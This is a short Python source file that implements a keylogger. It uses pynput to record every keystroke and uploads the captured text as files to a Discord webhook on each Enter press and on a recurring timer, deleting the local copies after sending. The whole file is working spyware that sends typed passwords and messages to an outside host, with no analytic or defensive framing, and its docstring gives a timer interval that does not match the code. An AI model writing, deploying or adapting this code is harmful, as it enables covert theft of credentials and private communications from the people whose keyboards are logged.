import os
import time
import requests
import threading
from pynput import keyboard
from datetime import datetime

WEBHOOK_URL = "webhook_url_here"
INTERVAL = 120 

log_buffer = []

def get_filename():
    return f"log_{datetime.now().strftime('%Y-%m-%d_%H-%M')}.txt"

def upload_to_discord(content):
    if not content.strip():
        return
    
    filename = get_filename()
    with open(filename, "w", encoding="utf-8") as f:
        f.write(content)
    
    try:
        with open(filename, "rb") as f:
            requests.post(WEBHOOK_URL, files={"file": (filename, f)})
        print(f"✅ Uploaded: {filename}")
    except Exception as e:
        print(f"Upload failed: {e}")
    
    try:
        os.remove(filename)
    except:
        pass

def auto_report():
    """Timer that triggers file upload every 60s"""
    global log_buffer
    if log_buffer:
        full_log = "".join(log_buffer)
        upload_to_discord(full_log)
        log_buffer = []
    
    timer = threading.Timer(INTERVAL, auto_report)
    timer.daemon = True
    timer.start()

def on_press(key):
    global log_buffer
    try:
        log_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log_buffer.append(" ")
        elif key == keyboard.Key.enter:
            log_buffer.append("\n")
            full_log = "".join(log_buffer)
            upload_to_discord(full_log)
            log_buffer = []
        elif key == keyboard.Key.backspace:
            if log_buffer:
                log_buffer.pop()

if __name__ == "__main__":
    print("logger started... (Uploading .txt files to Discord)")
    auto_report()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()